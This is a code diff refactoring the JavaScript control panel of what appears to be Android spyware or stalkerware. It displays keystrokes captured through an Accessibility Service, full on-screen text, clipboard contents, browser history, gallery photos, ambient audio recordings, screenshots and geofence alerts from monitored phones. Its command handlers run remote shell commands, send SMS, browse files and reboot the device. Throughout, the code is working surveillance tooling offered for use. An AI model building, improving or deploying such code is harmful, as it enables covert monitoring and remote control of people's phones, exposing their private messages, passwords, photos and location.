+            ['Status',d.status],
+            ['Health',d.health],
+            ['Temp',`${d.temperature_c||'?'}°C`],
+            ['Voltage',`${d.voltage_mv||'?'}mV`],
+            ['Source',d.charge_source],
+            ['Tech',d.technology]
+        ];
+        
+        const fragment = document.createDocumentFragment();
+        rows.forEach(([k,v]) => {
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `<strong>${k}:</strong> ${v||'--'}`;
+            fragment.appendChild(div);
+        });
+        
+        f.innerHTML = '';
+        f.appendChild(fragment);
     });
 
-    // ── KEYLOGGER — User input + App switches + Screen content ──
     listenToFeed(uid, 'keylog', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
-        const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
-        const f = document.getElementById('keylog-feed'); if(!f) return;
-        if(!items.length){f.innerHTML='No keystrokes yet (enable Accessibility Service)';return;}
+        const c = document.getElementById('keylog-count');
+        if(c) c.textContent = items.length;
+        
+        const f = document.getElementById('keylog-feed');
+        if(!f) return;
+        
+        const cacheKey = `keylog-${uid}-${items.length}`;
+        if (dataCache.has(cacheKey)) return;
+        dataCache.set(cacheKey, true);
+        
+        if(!items.length){
+            f.innerHTML='No keystrokes yet (enable Accessibility Service)';
+            return;
+        }
 
         var systemApps = ['com.samsung.android.biometrics', 'com.android.systemui',
             'com.samsung.android.app', 'com.google.android'];
@@ -361,11 +698,13 @@ function initializeDataFeedListeners(uid) {
             prev = {app: app, text: text, timestamp: k.timestamp, isAppSwitch: false, isScreenContent: isScreenContent};
         });
 
-        // Merge partial keystrokes (skip app_switch and screen_content)
         var merged = [];
         for(var i = 0; i < grouped.length; i++) {
             var cur = grouped[i];
-            if(cur.event === 'app_switch' || cur.event === 'screen_content') { merged.push(cur); continue; }
+            if(cur.event === 'app_switch' || cur.event === 'screen_content') { 
+                merged.push(cur); 
+                continue; 
+            }
             var skip = false;
             if(i + 1 < grouped.length) {
                 var next = grouped[i + 1];
@@ -381,6 +720,7 @@ function initializeDataFeedListeners(uid) {
         var display = merged.slice(0, 80);
         var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;">📝 CONTENT</span> full screen</div>';
 
+        const fragment = document.createDocumentFragment();
         display.forEach(function(k) {
             var icon, label, color, bgColor, borderColor;
 
@@ -400,96 +740,190 @@ function initializeDataFeedListeners(uid) {
 
             var appName = getFriendlyApp(k.app);
 
-            html += '<div class="feed-item" style="border-left:3px solid ' + borderColor + ';padding-left:8px;background:' + bgColor + ';">';
-            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
-            html += '<span style="color:' + color + ';font-size:10px;font-weight:bold;">' + icon + ' ' + label + '</span>';
-            html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(k.timestamp) + '</span>';
-            html += '</div>';
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.style.cssText = `border-left:3px solid ${borderColor};padding-left:8px;background:${bgColor};`;
+            
+            let content = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
+            content += `<span style="color:${color};font-size:10px;font-weight:bold;">${icon} ${label}</span>`;
+            content += `<span style="color:#555;font-size:9px;">${esc(appName)} • ${fmtTime(k.timestamp)}</span>`;
+            content += '</div>';
 
             if(k.event === 'app_switch') {
                 var prevName = k.previous_app ? getFriendlyApp(k.previous_app) : 'Home';
-                html += '<div style="color:#ff6b6b;font-size:11px;">' + esc(prevName) + ' → <strong>' + esc(appName) + '</strong></div>';
+                content += `<div style="color:#ff6b6b;font-size:11px;">${esc(prevName)} → <strong>${esc(appName)}</strong></div>`;
             } else if(k.event === 'screen_content') {
-                html += '<div style="color:#a78bfa;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;line-height:1.6;padding:6px;background:rgba(0,0,0,0.2);border-radius:4px;margin-top:4px;">' + esc(k.text) + '</div>';
+                content += `<div style="color:#a78bfa;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;line-height:1.6;padding:6px;background:rgba(0,0,0,0.2);border-radius:4px;margin-top:4px;">${esc(k.text)}</div>`;
             } else {
-                html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
+                content += `<code style="color:#fff;font-size:11px;word-break:break-all;">${esc(k.text)}</code>`;
             }
-            html += '</div>';
+            
+            div.innerHTML = content;
+            fragment.appendChild(div);
         });
 
         f.innerHTML = html;
+        f.appendChild(fragment);
     });
 
-    // ── SCREEN CONTENT — Full visible text (app responses, ChatGPT replies, etc.) ──
     listenToFeed(uid, 'screen_content', (d) => {
         if(!d || !d.text) return;
         var f = document.getElementById('keylog-feed');
         if(!f) return;
         var appName = getFriendlyApp(d.app);
         var triggerLabel = d.trigger === 'app_switch' ? 'App opened' : d.trigger === 'after_input' ? 'After typing' : 'Screen changed';
-        var html = '<div class="feed-item" style="border-left:3px solid #a78bfa;padding-left:8px;background:rgba(167,139,250,0.1);margin-bottom:4px;">';
-        html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">';
-        html += '<span style="color:#a78bfa;font-size:10px;font-weight:bold;">📝 FULL SCREEN — ' + esc(triggerLabel) + '</span>';
-        html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(d.timestamp) + '</span>';
+        
+        const div = document.createElement('div');
+        div.className = 'feed-item';
+        div.style.cssText = 'border-left:3px solid #a78bfa;padding-left:8px;background:rgba(167,139,250,0.1);margin-bottom:4px;';
+        
+        let html = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">';
+        html += `<span style="color:#a78bfa;font-size:10px;font-weight:bold;">📝 FULL SCREEN — ${esc(triggerLabel)}</span>`;
+        html += `<span style="color:#555;font-size:9px;">${esc(appName)} • ${fmtTime(d.timestamp)}</span>`;
         html += '</div>';
-        html += '<div style="color:#e0d4ff;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.6;background:rgba(0,0,0,0.3);padding:10px;border-radius:4px;">' + esc(d.text) + '</div>';
-        html += '</div>';
-        f.innerHTML = html + f.innerHTML;
+        html += `<div style="color:#e0d4ff;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.6;background:rgba(0,0,0,0.3);padding:10px;border-radius:4px;">${esc(d.text)}</div>`;
+        
+        div.innerHTML = html;
+        f.insertBefore(div, f.firstChild);
     });
 
     listenToFeed(uid, 'geofence_alerts', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
-        const f = document.getElementById('geofence-feed'); if(!f) return;
-        if(!items.length){f.innerHTML='No geofence alerts';return;}
-        f.innerHTML = items.map(g=>{const i=g.event==='LEFT'?'🚨':'✅';return `<div class="feed-item ${g.event==='LEFT'?'alert-item':''}">${i} <strong>${g.event}</strong> <small>${fmtTime(g.timestamp)} • ${Math.round(g.distance_meters||0)}m</small><br>📍 ${parseFloat(g.current_lat||0).toFixed(6)}, ${parseFloat(g.current_lng||0).toFixed(6)}</div>`;}).join('');
-    });
-    listenToFeed(uid, 'clipboard', (d) => {
-        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
-        const f = document.getElementById('clipboard-feed'); if(!f) return;
-        if(!items.length){f.innerHTML='No clipboard data yet';return;}
-        f.innerHTML = items.map(c=>`<div class="feed-item"><small>${fmtTime(c.timestamp)} • ${c.length||0} chars</small><br><code>${esc((c.text||'').substring(0,200))}</code></div>`).join('');
-    });
-    listenToFeed(uid, 'clipboard_current', (d) => {
-        const f = document.getElementById('clipboard-feed'); if(!f||!d||!d.text) return;
-        f.innerHTML = `<div class="feed-item live-item">📋 <strong>CURRENT</strong> <small>${fmtTime(d.timestamp)}</small><br><code>${esc(d.text.substring(0,300))}</code></div>` + f.innerHTML;
-    });
-    listenToFeed(uid, 'browser_history', (d) => {
-        const h = d.history||[]; const f = document.getElementById('browser-feed'); if(!f) return;
-        if(!h.length){f.innerHTML='No browser history yet';return;}
-        f.innerHTML = h.slice(0,50).map(h=>`<div class="feed-item"><strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small></div>`).join('');
-    });
-
-    // ── GALLERY ──
-    listenToFeed(uid, 'gallery_list', (d) => {
-        const p = d.photos||[]; const f = document.getElementById('gallery-feed'); if(!f) return;
-        if(d.status==='loading') {
-            let html = `<div class="feed-item" style="color:#ffaa00;">⏳ Loading thumbnails... ${d.total_read||0} photos processed</div>`;
-            html += p.slice(0,10).map(p => {
-                const thumb = p.thumbnail_url || '';
-                const imgHtml = thumb
-                    ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;" loading="lazy">`
-                    : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">Generating...</div>`;
-                return `<div class="feed-item">${imgHtml}<small>${esc(p.name||'')} • ${(p.size_kb||0)}KB</small></div>`;
-            }).join('');
-            f.innerHTML = html;
+        const f = document.getElementById('geofence-feed');
+        if(!f) return;
+        
+        if(!items.length){
+            f.innerHTML='No geofence alerts';
             return;
         }
-        if(!p.length){f.innerHTML='No gallery data yet';return;}
-        f.innerHTML = p.slice(0,30).map(p => {
-            const thumb = p.thumbnail_url || '';
-            const imgHtml = thumb
-                ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="openPreview(this.src)" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
-                   <div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:none;align-items:center;justify-content:center;color:#555;font-size:10px;">Failed to load</div>`
-                : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">No thumbnail</div>`;
-            return `<div class="feed-item">${imgHtml}<strong>${esc(p.name||'Unknown')}</strong> <small>${fmtTime(p.date_taken)} • ${(p.size_kb||0)}KB</small></div>`;
-        }).join('');
+        
+        const fragment = document.createDocumentFragment();
+        items.forEach(g => {
+            const i = g.event==='LEFT'?'🚨':'✅';
+            const div = document.createElement('div');
+            div.className = `feed-item ${g.event==='LEFT'?'alert-item':''}`;
+            div.innerHTML = `${i} <strong>${g.event}</strong> <small>${fmtTime(g.timestamp)} • ${Math.round(g.distance_meters||0)}m</small><br>📍 ${parseFloat(g.current_lat||0).toFixed(6)}, ${parseFloat(g.current_lng||0).toFixed(6)}`;
+            fragment.appendChild(div);
+        });
+        
+        f.innerHTML = '';
+        f.appendChild(fragment);
+    });
+    
+    listenToFeed(uid, 'clipboard', (d) => {
+        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
+        const f = document.getElementById('clipboard-feed');
+        if(!f) return;
+        
+        if(!items.length){
+            f.innerHTML='No clipboard data yet';
+            return;
+        }
+        
+        const fragment = document.createDocumentFragment();
+        items.forEach(c => {
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `<small>${fmtTime(c.timestamp)} • ${c.length||0} chars</small><br><code>${esc((c.text||'').substring(0,200))}</code>`;
+            fragment.appendChild(div);
+        });
+        
+        f.innerHTML = '';
+        f.appendChild(fragment);
+    });
+    
+    listenToFeed(uid, 'clipboard_current', (d) => {
+        const f = document.getElementById('clipboard-feed');
+        if(!f||!d||!d.text) return;
+        
+        const div = document.createElement('div');
+        div.className = 'feed-item live-item';
+        div.innerHTML = `📋 <strong>CURRENT</strong> <small>${fmtTime(d.timestamp)}</small><br><code>${esc(d.text.substring(0,300))}</code>`;
+        
+        f.insertBefore(div, f.firstChild);
+    });
+    
+    listenToFeed(uid, 'browser_history', (d) => {
+        const h = d.history||[];
+        const f = document.getElementById('browser-feed');
+        if(!f) return;
+        
+        if(!h.length){
+            f.innerHTML='No browser history yet';
+            return;
+        }
+        
+        const fragment = document.createDocumentFragment();
+        h.slice(0,50).forEach(h => {
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `<strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small>`;
+            fragment.appendChild(div);
+        });
+        
+        f.innerHTML = '';
+        f.appendChild(fragment);
     });
 
-    // ── SHELL OUTPUT ──
+    listenToFeed(uid, 'gallery_list', (d) => {
+        const p = d.photos||[];
+        const f = document.getElementById('gallery-feed');
+        if(!f) return;
+        
+        if(d.status==='loading') {
+            let html = `<div class="feed-item" style="color:#ffaa00;">⏳ Loading thumbnails... ${d.total_read||0} photos processed</div>`;
+            
+            const fragment = document.createDocumentFragment();
+            p.slice(0,10).forEach(photo => {
+                const thumb = photo.thumbnail_url || '';
+                const div = document.createElement('div');
+                div.className = 'feed-item';
+                
+                if (thumb) {
+                    div.innerHTML = `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;" loading="lazy"><small>${esc(photo.name||'')} • ${(photo.size_kb||0)}KB</small>`;
+                } else {
+                    div.innerHTML = `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">Generating...</div><small>${esc(photo.name||'')} • ${(photo.size_kb||0)}KB</small>`;
+                }
+                
+                fragment.appendChild(div);
+            });
+            
+            f.innerHTML = html;
+            f.appendChild(fragment);
+            return;
+        }
+        
+        if(!p.length){
+            f.innerHTML='No gallery data yet';
+            return;
+        }
+        
+        const fragment = document.createDocumentFragment();
+        p.slice(0,30).forEach(photo => {
+            const thumb = photo.thumbnail_url || '';
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            
+            if (thumb) {
+                div.innerHTML = `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="openPreview(this.src)" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';"><div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:none;align-items:center;justify-content:center;color:#555;font-size:10px;">Failed to load</div><strong>${esc(photo.name||'Unknown')}</strong> <small>${fmtTime(photo.date_taken)} • ${(photo.size_kb||0)}KB</small>`;
+            } else {
+                div.innerHTML = `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">No thumbnail</div><strong>${esc(photo.name||'Unknown')}</strong> <small>${fmtTime(photo.date_taken)} • ${(photo.size_kb||0)}KB</small>`;
+            }
+            
+            fragment.appendChild(div);
+        });
+        
+        f.innerHTML = '';
+        f.appendChild(fragment);
+    });
+
     listenToFeed(uid, 'shell_output', (d) => {
-        const o = document.getElementById('shell-output'); if(!o||!d) return;
+        const o = document.getElementById('shell-output');
+        if(!o||!d) return;
+        
         o.style.display = 'block';
         let text = '$ ' + (d.command||'') + '\n\n';
+        
         if(d.exit_code === -999) {
             text += '⏳ Executing...\n';
         } else {
@@ -498,13 +932,17 @@ function initializeDataFeedListeners(uid) {
             text += '\n\nExit code: ' + (d.exit_code ?? '?');
             if(d.timed_out) text += ' ⚠️ TIMED OUT';
         }
-        o.textContent = text;
-        o.scrollTop = o.scrollHeight;
+        
+        if (o.textContent !== text) {
+            o.textContent = text;
+            o.scrollTop = o.scrollHeight;
+        }
     });
 
-    // ── FILE BROWSER ──
     listenToFeed(uid, 'file_browser', (d) => {
-        const o = document.getElementById('file-output'); if(!o||!d) return;
+        const o = document.getElementById('file-output');
+        if(!o||!d) return;
+        
         o.style.display = 'block';
 
         if(d.error) {
@@ -610,28 +1048,64 @@ function initializeDataFeedListeners(uid) {
     });
 
     listenToFeed(uid, 'geofence_status', (d) => {
-        const f = document.getElementById('geofence-feed'); if(!f||!d||!d.active) return;
-        f.innerHTML = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${d.lat}, ${d.lng} (radius: ${d.radius}m)</div>` + f.innerHTML;
+        const f = document.getElementById('geofence-feed');
+        if(!f||!d||!d.active) return;
+        
+        const div = document.createElement('div');
+        div.className = 'feed-item';
+        div.style.color = '#ffd93d';
+        div.textContent = `📍 Geofence ACTIVE at ${d.lat}, ${d.lng} (radius: ${d.radius}m)`;
+        
+        f.insertBefore(div, f.firstChild);
     });
+    
     listenToFeed(uid, 'screenshot', (d) => {
         if(!d||!d.screenshot) return;
-        const img = document.getElementById('cameraPreviewFrame'); const ph = document.getElementById('mediaPlaceholderText');
-        if(img){if(ph) ph.style.display='none'; img.src=d.screenshot; img.style.display='block'; const ts=document.getElementById('captureTimestamp'); if(ts) ts.innerText=`SCREENSHOT: ${new Date().toLocaleTimeString()}`;}
+        const img = document.getElementById('cameraPreviewFrame');
+        const ph = document.getElementById('mediaPlaceholderText');
+        
+        if(img){
+            if(ph) ph.style.display='none';
+            if (img.src !== d.screenshot) img.src = d.screenshot;
+            img.style.display='block';
+            const ts=document.getElementById('captureTimestamp');
+            if(ts) ts.innerText=`SCREENSHOT: ${new Date().toLocaleTimeString()}`;
+        }
     });
 
     listenToFeed(uid, 'ambient_status', (d) => {
-        const b = document.getElementById('cmd-ambient'); if(!b||!d) return;
+        const b = document.getElementById('cmd-ambient');
+        if(!b||!d) return;
         const s = b.querySelector('.toggle-state');
+        
         if(d.status==='recording'){
             b.classList.add('active');
-            if(s){s.textContent=`SEG ${d.segment||'?'}`;s.style.color='#ffaa00';}
+            if(s){
+                const newText = `SEG ${d.segment||'?'}`;
+                if (s.textContent !== newText) {
+                    s.textContent = newText;
+                    s.style.color='#ffaa00';
+                }
+            }
         } else if(d.status==='stopped'){
             b.classList.remove('active');
-            if(s){s.textContent=`${d.total_segments||0} SEGS`;s.style.color='#00ff88';}
+            if(s){
+                const newText = `${d.total_segments||0} SEGS`;
+                if (s.textContent !== newText) {
+                    s.textContent = newText;
+                    s.style.color='#00ff88';
+                }
+            }
         } else {
             b.classList.remove('active');
-            if(s){s.textContent='OFF';s.style.color='#666';}
+            if(s){
+                if (s.textContent !== 'OFF') {
+                    s.textContent='OFF';
+                    s.style.color='#666';
+                }
+            }
         }
+        
         const af = document.getElementById('ambient-feed');
         if(af) {
             let html = `<div class="feed-item"><strong>Status:</strong> ${d.status||'unknown'}</div>`;
@@ -641,15 +1115,19 @@ function initializeDataFeedListeners(uid) {
                 html += `<div class="feed-item"><strong>Latest Recording:</strong><br><audio controls src="${d.last_audio_url}" style="width:100%;margin-top:8px;"></audio></div>`;
             }
             if(d.last_audio_segment) html += `<div class="feed-item"><small>${d.last_audio_segment}</small></div>`;
-            af.innerHTML = html;
+            
+            if (af.innerHTML !== html) af.innerHTML = html;
         }
+        
         if(d.last_audio_url) {
             const aud = document.getElementById('mediaAudioPlayer');
             const audC = document.getElementById('audio-container');
             const ph = document.getElementById('mediaPlaceholderText');
+            
             if(aud && aud.src !== d.last_audio_url) {
                 if(ph) ph.style.display='none';
-                aud.src = d.last_audio_url; aud.load();
+                aud.src = d.last_audio_url;
+                aud.load();
                 aud.style.display='block';
                 if(audC) audC.style.display='block';
                 const ts = document.getElementById('captureTimestamp');
@@ -659,14 +1137,47 @@ function initializeDataFeedListeners(uid) {
     });
 
     listenToFeed(uid, 'screen_record_status', (d) => {
-        const b = document.getElementById('cmd-screenrec'); if(!b||!d) return; const s = b.querySelector('.toggle-state');
-        if(d.status==='recording'){b.classList.add('active');if(s){s.textContent='REC';s.style.color='#ffaa00';}}
-        else if(d.status==='complete'){b.classList.remove('active');if(s){s.textContent=`${d.file_size_kb||'?'}KB`;s.style.color='#00ff88';}}
-        else{b.classList.remove('active');if(s){s.textContent='OFF';s.style.color='#666';}}
+        const b = document.getElementById('cmd-screenrec');
+        if(!b||!d) return;
+        const s = b.querySelector('.toggle-state');
+        
+        if(d.status==='recording'){
+            b.classList.add('active');
+            if(s){
+                if (s.textContent !== 'REC') {
+                    s.textContent='REC';
+                    s.style.color='#ffaa00';
+                }
+            }
+        } else if(d.status==='complete'){
+            b.classList.remove('active');
+            if(s){
+                const newText = `${d.file_size_kb||'?'}KB`;
+                if (s.textContent !== newText) {
+                    s.textContent = newText;
+                    s.style.color='#00ff88';
+                }
+            }
+        } else {
+            b.classList.remove('active');
+            if(s){
+                if (s.textContent !== 'OFF') {
+                    s.textContent='OFF';
+                    s.style.color='#666';
+                }
+            }
+        }
     });
 
     listenToFeed(uid, 'traffic_current', (d) => {
-        const f = document.getElementById('traffic-feed'); if(!f||!d) return;
+        const f = document.getElementById('traffic-feed');
+        if(!f||!d) return;
+        
+        const cacheKey = `traffic-${uid}`;
+        const cached = dataCache.get(cacheKey);
+        if (cached && JSON.stringify(cached) === JSON.stringify(d)) return;
+        dataCache.set(cacheKey, d);
+        
         let html = `<div class="feed-item"><strong>📊 Total</strong></div>`;
         html += `<div class="feed-item">RX: ${d.total_rx_mb||'?'} MB | TX: ${d.total_tx_mb||'?'} MB</div>`;
         html += `<div class="feed-item"><strong>📱 Mobile</strong></div>`;
@@ -676,36 +1187,61 @@ function initializeDataFeedListeners(uid) {
             html += `<div class="feed-item">RX: ${d.wifi_rx_mb||'?'} MB | TX: ${d.wifi_tx_mb||'?'} MB</div>`;
         }
         html += `<div class="feed-item"><small>${fmtTime(d.timestamp)}</small></div>`;
-        f.innerHTML = html;
+        
+        if (f.innerHTML !== html) f.innerHTML = html;
+        
         const bf = document.getElementById('battery-feed');
         if(bf && !bf.innerHTML.includes('Network Traffic')) {
             bf.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Traffic</strong> RX:${d.total_rx_mb||'?'} TX:${d.total_tx_mb||'?'} MB</div>`;
         }
     });
 
-    // ── DEVICE CONTROL STATUS ──
     listenToFeed(uid, 'device_control_status', (d) => {
-        const f = document.getElementById('devicecontrol-feed'); if(!f||!d) return;
+        const f = document.getElementById('devicecontrol-feed');
+        if(!f||!d) return;
+        
         var icon = d.status === 'success' ? '✅' : d.status === 'ui_opened' ? '📱' : '❌';
         var color = d.status === 'success' ? '#00ff88' : d.status === 'ui_opened' ? '#ffd93d' : '#ff6b6b';
         var actionName = (d.action || 'unknown').replace(/_/g, ' ').toUpperCase();
-        var html = '<div class="feed-item" style="border-left:3px solid ' + color + ';padding-left:10px;">';
-        html += '<div style="color:' + color + ';font-weight:bold;font-size:12px;">' + icon + ' ' + actionName + ' — ' + (d.status || '').toUpperCase() + '</div>';
-        html += '<div style="color:#888;font-size:11px;margin-top:4px;">' + esc(d.message || '') + '</div>';
-        html += '<div style="color:#555;font-size:10px;margin-top:2px;">' + fmtTime(d.timestamp) + '</div>';
-        html += '</div>';
-        f.innerHTML = html;
+        
+        const div = document.createElement('div');
+        div.className = 'feed-item';
+        div.style.cssText = `border-left:3px solid ${color};padding-left:10px;`;
+        
+        let html = `<div style="color:${color};font-weight:bold;font-size:12px;">${icon} ${actionName} — ${(d.status || '').toUpperCase()}</div>`;
+        html += `<div style="color:#888;font-size:11px;margin-top:4px;">${esc(d.message || '')}</div>`;
+        html += `<div style="color:#555;font-size:10px;margin-top:2px;">${fmtTime(d.timestamp)}</div>`;
+        
+        div.innerHTML = html;
+        f.insertBefore(div, f.firstChild);
+        
         console.log(icon + ' ' + (d.action||'?') + ': ' + (d.message||''));
     });
 }
 
 function listenToFeed(uid, path, cb) {
-    const r = ref(database, `devices/${uid}/${path}`); const k = `feed-${path}-${uid}`;
-    if(deviceListeners[k]) off(deviceListeners[k]);
-    deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
+    const r = ref(database, `devices/${uid}/${path}`);
+    const k = `feed-${path}-${uid}`;
+    
+    if (deviceListeners.has(k)) {
+        off(deviceListeners.get(k));
+    }
+    
+    const unsubscribe = onValue(r, (s) => {
+        if(s.exists()) {
+            try {
+                cb(s.val());
+            } catch(e) {
+                console.error(`Feed [${path}]:`, e);
+            }
+        }
+    }, (error) => {
+        console.error(`❌ Feed listener error [${path}]:`, error);
+    });
+    
+    deviceListeners.set(k, unsubscribe);
 }
 
-// ── FRIENDLY APP NAMES (35+ apps) ──
 function getFriendlyApp(pkg) {
     if(!pkg) return 'Unknown';
     if(pkg.indexOf('whatsapp') >= 0) return 'WhatsApp';
@@ -775,7 +1311,10 @@ window.navigateToFile = function(path) {
     if(!selectedDevice) return;
     sendCmd(selectedDevice, 'list_files', path.trim());
     var o = document.getElementById('file-output');
-    if(o) { o.style.display='block'; o.innerHTML='<span style="color:#ffaa00;">⏳ Loading ' + esc(path) + '...</span>'; }
+    if(o) { 
+        o.style.display='block'; 
+        o.innerHTML='<span style="color:#ffaa00;">⏳ Loading ' + esc(path) + '...</span>'; 
+    }
     var inp = document.getElementById('file-path');
     if(inp) inp.value = path.trim();
 };
@@ -784,7 +1323,10 @@ function setupCommandListeners(uid) {
     setupToggle('cmd-flashlight', uid, 'flashlight');
     setupToggle('cmd-alarm', uid, 'alarm');
     const cmdLock = document.getElementById('cmd-lock');
-    if(cmdLock) cmdLock.onclick = () => { const s=!cmdLock.classList.contains("active"); if(confirm(s?"🔒 Initialize Lockdown?":"🔓 Deactivate Lockdown?")) sendCmd(uid,"emergencyLock",s); };
+    if(cmdLock) cmdLock.onclick = () => { 
+        const s=!cmdLock.classList.contains("active"); 
+        if(confirm(s?"🔒 Initialize Lockdown?":"🔓 Deactivate Lockdown?")) sendCmd(uid,"emergencyLock",s); 
+    };
 
     setupTrigger('cmd-capture', uid, 'cameraCapture');
     setupTrigger('cmd-screenshot', uid, 'take_screenshot');
@@ -807,65 +1349,173 @@ function setupCommandListeners(uid) {
     setupToggle('cmd-clipboard', uid, 'monitor_clipboard');
 
     const ts = document.getElementById('time-setter');
-    if(ts) ts.onchange = (e) => { if(e.target.value) sendCmd(uid,'activation_time',e.target.value); };
+    if(ts) ts.onchange = (e) => { 
+        if(e.target.value) sendCmd(uid,'activation_time',e.target.value); 
+    };
 
     const sb = document.getElementById('cmd-shell');
-    if(sb) sb.onclick = () => { const c=document.getElementById('shell-input')?.value?.trim()||'ls /sdcard'; sendCmd(uid,'shell_command',c); const o=document.getElementById('shell-output'); if(o){o.style.display='block';o.textContent='⏳ Executing...';} };
+    if(sb) sb.onclick = () => { 
+        const c=document.getElementById('shell-input')?.value?.trim()||'ls /sdcard'; 
+        sendCmd(uid,'shell_command',c); 
+        const o=document.getElementById('shell-output'); 
+        if(o){
+            o.style.display='block';
+            o.textContent='⏳ Executing...';
+        } 
+    };
 
     const ssb = document.getElementById('cmd-sendsms');
-    if(ssb) ssb.onclick = () => { const n=document.getElementById('sms-number')?.value?.trim(); const b=document.getElementById('sms-body')?.value?.trim(); if(n&&b&&confirm(`Send SMS to ${n}?`)){sendCmd(uid,'send_sms_number',n);sendCmd(uid,'send_sms_body',b);} };
+    if(ssb) ssb.onclick = () => { 
+        const n=document.getElementById('sms-number')?.value?.trim(); 
+        const b=document.getElementById('sms-body')?.value?.trim(); 
+        if(n&&b&&confirm(`Send SMS to ${n}?`)){
+            sendCmd(uid,'send_sms_number',n);
+            sendCmd(uid,'send_sms_body',b);
+        } 
+    };
 
     const lfb = document.getElementById('cmd-listfiles');
-    if(lfb) lfb.onclick = () => { const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; sendCmd(uid,'list_files',p); const o=document.getElementById('file-output'); if(o){o.style.display='block';o.innerHTML='<span style="color:#ffaa00;">⏳ Loading...</span>';} };
+    if(lfb) lfb.onclick = () => { 
+        const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; 
+        sendCmd(uid,'list_files',p); 
+        const o=document.getElementById('file-output'); 
+        if(o){
+            o.style.display='block';
+            o.innerHTML='<span style="color:#ffaa00;">⏳ Loading...</span>';
+        } 
+    };
 
     const sgb = document.getElementById('cmd-setgeo');
-    if(sgb) sgb.onclick = () => { const la=parseFloat(document.getElementById('geo-lat')?.value); const ln=parseFloat(document.getElementById('geo-lng')?.value); const r=parseFloat(document.getElementById('geo-radius')?.value)||1000; if(!isNaN(la)&&!isNaN(ln)){sendCmd(uid,'geofence_lat',la);sendCmd(uid,'geofence_lng',ln);sendCmd(uid,'geofence_radius',r);} };
+    if(sgb) sgb.onclick = () => { 
+        const la=parseFloat(document.getElementById('geo-lat')?.value); 
+        const ln=parseFloat(document.getElementById('geo-lng')?.value); 
+        const r=parseFloat(document.getElementById('geo-radius')?.value)||1000; 
+        if(!isNaN(la)&&!isNaN(ln)){
+            sendCmd(uid,'geofence_lat',la);
+            sendCmd(uid,'geofence_lng',ln);
+            sendCmd(uid,'geofence_radius',r);
+        } 
+    };
+    
     const dgb = document.getElementById('cmd-disablegeo');
     if(dgb) dgb.onclick = () => sendCmd(uid,'disable_geofence',true);
 
     const rb = document.getElementById('cmd-reboot');
-    if(rb) rb.onclick = () => { if(confirm("⚠️ REBOOT DEVICE?")) sendCmd(uid,'reboot_device',true); };
+    if(rb) rb.onclick = () => { 
+        if(confirm("⚠️ REBOOT DEVICE?")) sendCmd(uid,'reboot_device',true); 
+    };
+    
     const sdb = document.getElementById('cmd-shutdown');
